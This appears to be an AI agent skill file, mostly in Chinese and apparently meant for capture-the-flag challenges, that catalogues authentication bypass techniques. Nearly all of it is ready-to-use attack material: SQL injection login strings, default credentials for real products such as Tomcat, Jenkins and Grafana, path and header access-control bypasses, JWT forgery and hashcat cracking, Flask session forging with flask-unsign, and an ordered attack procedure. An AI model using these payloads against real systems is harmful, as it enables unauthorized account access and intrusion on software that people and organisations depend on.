---
name: auth-bypass-techniques
description: 认证绕过完整技巧集。Use when the challenge requires bypassing login, session, or authentication mechanisms. Covers SQL injection login bypass, default credentials, token manipulation, session fixation, OAuth flaws, and 2FA bypass.
---

# 认证绕过技巧集

## 1. SQL 注入登录绕过

```sql
-- 基础(以 admin 身份登录)
Username: admin'--
Password: anything

-- 通用(第一个用户)
Username: ' OR '1'='1'--
Password: anything

-- 变体(逐一试)
admin' OR 'a'='a
1' OR '1'='1'/*
' OR 1=1--
' OR 1=1#
admin'/*
' UNION SELECT 1,'admin','password'--
```

**两个字段都要分别试** — 有些只有 password 字段有注入。

## 2. 默认/弱凭据

### 常见产品默认口令
| 产品 | 用户名 | 密码 |
|---|---|---|
| 1Panel | admin | 初始安装时设置(试 admin/123456/1panel) |
| Tomcat Manager | tomcat / admin | tomcat / s3cret / admin |
| Jenkins | admin | admin / jenkins |
| phpMyAdmin | root | (空) / root / 123456 |
| Grafana | admin | admin |
| Nacos | nacos | nacos |
| Elasticsearch | elastic | changeme |
| Redis | (无认证) | 直接连 |
| MongoDB | (无认证) | 直接连 |
| Jupyter | (无认证) | 或 token 在启动日志 |
| Spring Actuator | (无认证) | 直连 /actuator |
| Swagger UI | (无认证) | 直连 /swagger-ui.html |

### 高频弱密码表(CTF 向)
```
admin / admin
admin / 123456
admin / admin123
admin / password
root / root
root / toor
test / test
guest / guest
用户名 / 用户名 (如 zhangsan/zhangsan)
用户名 / 用户名+123
工号 / 初始密码(公司名首字母+@+年份: Abc@2024)
```

## 3. 路径/中间件绕过鉴权

```bash
# 直接访问后端路径(绕过前端鉴权)
/admin → 403
/Admin → 200 (大小写)
/admin/ → 200 (尾斜杠)
/./admin → 200 (点路径)
/admin;.css → 200 (Tomcat 后缀绕过)
/admin%20 → 200 (空格)
/admin%09 → 200 (Tab)
/%2fadmin → 200 (编码斜杠)

# HTTP 方法绕过
GET /admin → 403
POST /admin → 200
HEAD /admin → 200

# Header 绕过(模拟内网)
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

## 4. JWT 操纵

```bash
# 算法混淆: RS256 → none
# 把 header 里的 alg 改成 "none", signature 留空
# base64url({"alg":"none","typ":"JWT"}).base64url(payload).

# 算法降级: RS256 → HS256
# 用公钥当 HMAC secret 签名(如果服务端用同一个 key 验证)

# 弱 secret 爆破
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
# 常见弱 secret: secret, key, 123456, password, jwt_secret

# kid 路径穿越
# Header: {"kid":"../../../dev/null"} → HMAC key = 空文件内容
# Header: {"kid":"../../../etc/hostname"} → HMAC key = hostname 内容
```

## 5. Session/Cookie 操纵

```bash
# Flask session 解码(如果 SECRET_KEY 已知或泄露)
python3 -c "
import base64, zlib, json
cookie = 'YOUR_FLASK_SESSION_COOKIE'
# Flask session = base64(zlib(json)) + '.' + timestamp + '.' + signature
payload = base64.urlsafe_b64decode(cookie.split('.')[0] + '==')
try: data = zlib.decompress(payload)
except: data = payload
print(json.loads(data))
"

# 伪造: 用已知 SECRET_KEY 签名自己的 session
pip install flask-unsign
flask-unsign --sign --cookie "{'role':'admin','user_id':1}" --secret "SECRET_KEY"
```

## 6. 密码重置漏洞

- Token 可预测(时间戳/MD5(email)/短位数字 → 爆破)
- Token 不过期(请求后等很久仍能用)
- Host header 投毒(改 Host → 重置邮件里的链接指向你的域)
- 响应中直接泄露 token

## 铁律

- **先试 SQL 注入绕过**(最快,30 秒内验证)
- 再试**默认凭据**(根据产品指纹选密码表)
- 然后**路径绕过**(大小写/斜杠/编码)
- 最后 JWT/Session 操纵(需要更多分析)
- **看响应差异**: "用户不存在" vs "密码错误" = 可枚举用户名
